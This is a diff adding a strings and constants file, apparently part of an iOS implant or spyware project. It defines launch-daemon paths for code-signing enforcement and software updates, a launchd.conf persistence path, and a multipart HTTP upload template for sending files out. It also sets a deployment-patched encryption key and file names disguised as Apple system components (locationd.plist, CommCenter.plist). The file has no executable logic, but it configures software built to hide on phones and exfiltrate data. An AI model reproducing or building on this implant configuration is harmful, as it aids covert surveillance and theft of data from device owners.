@@ -1,0 +1,73 @@
+
+#string[255] DAEMON "com.apple.locationd.plist"
+
+#cfstringref AMFI_PATH          "/System/Library/LaunchDaemons/com.apple.MobileFileIntegrity.plist"
+#cfstringref OTA_PATH           "/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist"
+#cfstringref OTA_CHECKER_PATH   "/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist"
+#cfstringref LOCATIOND_PATH     "/System/Library/LaunchDaemons/com.apple.locationd.plist"
+#cfstringref SPRINGBOARD_PATH   "/System/Library/LaunchDaemons/com.apple.SpringBoard.plist"
+
+// the target type is patched during deployment. (a/b)
+#string HTTP_BODY_TEMPLATE_PRE "--%s\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%s\r\n--%s\r\nContent-Disposition: form-data; name=\"t\"\r\n\r\na\r\n--%s\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n%d\r\n--%s\r\nContent-Disposition: form-data; name=\"uploadedFile\"; filename=\"%s\"\r\nContent-Type: text/plain\r\n\r\n"
+// data goes here.
+
+
+#string USER_IGNORE "Shared"
+
+#string NET_DEVICE_PREFIX "en"
+#string IPHONE_IF_CELL "pdp_ip0"
+
+// stuff that gets patched ****************************************
+
+#cfstringref ICT_SYS_DIR    "/usr/lib/Lock/"
+#cfstringref ICT_USER_DIR   "/private/var/root/Library/Lock"
+#cfstringref LAUNCHD_CONF_PATH "/etc/launchd.conf"
+
+#cfstringref NAME_FS        "fs"
+#cfstringref NAME_AMFI      "libamfi.dylib"
+#cfstringref NAME_LOADER    "libdyld.dylib"
+#cfstringref NAME_LIB1      "libsbox.dylib"
+#cfstringref NAME_LIB2      "libzbox.dylib"
+#cfstringref NAME_LIBJMT    "libjmt.dylib"
+#cfstringref NAME_LIBTOKICO "liblock.dylib"
+#cfstringref NAME_CONFIG    "themainconfig.plist"
+#cfstringref NAME_CONFIG2   "theupgradeconfig.plist"
+#cfstringref NAME_LOG       "locationd.plist"
+#cfstringref NAME_OVERRIDES "overrides.plist"
+
+//! this looks funny because it is patched before being run. it is replaced with the actual location and a null byte.
+#string[255] CONFIG_FILENAME "/System/Library/PreferenceBundles/CommCenter.plist"
+//! this gets patched as well.
+#string[16] CRYPTKEY "passwordpassword"
+
+#string[16] DEFAULT_IV "1111111111111111"
+
+// done stuff that gets patched ***********************************
+
+#string DEVELOPER_DMG_PATH "/Developer"
+
+#string DM_NVRAM_KEY_NAME "026bd6b6-8c52-4090-977b-66d15f598a69:SystemAudioVolume"
+
+
+// STRINGS
+
+#string DLOPEN_RESP "Called dlopen"
+#cfstringref MOUNT_POINT "/"
+
+//launchctl strings
+#cfstringref LAUNCHCTL_AMFI_PATH    "/System/Library/LaunchDaemons/com.apple.MobileFileIntegrity.plist"
+
+// #string PATH_FIREFOX_NAME "firefox"
+// #string PATH_FIREFOX_TEMPLATE "/Users/%s/Library/Caches/Firefox/Profiles/%s/Cache"
+// #define PATH_FIREFOX_PROFILE_OFFSET 8   // path to profile dir minus '%s/Cache'. needed to walk path
+
+#cfstringref IOSVERSION_SEPARATOR "."
+
+// paths and values related to jailbreak scene
+
+#string JB_CYDIA "/Applications/Cydia.app"
+#string JB_ICY "/Applications/Icy.app"
+#string JB_BASH "/bin/bash"
+#string JB_SH "/bin/sh"
+#string JB_DPKG "/usr/bin/dpkg"
+
